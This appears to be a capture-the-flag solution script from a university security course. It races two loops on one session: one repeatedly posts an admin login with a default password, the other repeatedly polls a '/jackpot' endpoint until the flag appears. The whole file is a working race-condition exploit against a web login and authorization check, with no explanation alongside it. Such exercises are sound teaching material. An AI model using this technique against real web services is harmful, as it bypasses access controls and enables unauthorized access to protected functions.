import requests
from multiprocessing import Process

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25652 

link = f"{SERVER}:{PORT}"

s = requests.Session()

s.get(link)

data = {'username': 'admin', 'password': 'password'}

def race():
    while True:
        r  = s.get(f"{link}/jackpot")    
        if ("SSof{" in r.text):
            print(r.text)
            break
        
process = Process(target=race)
process.start()

while True:
    s.post(f"{link}/login", data=data)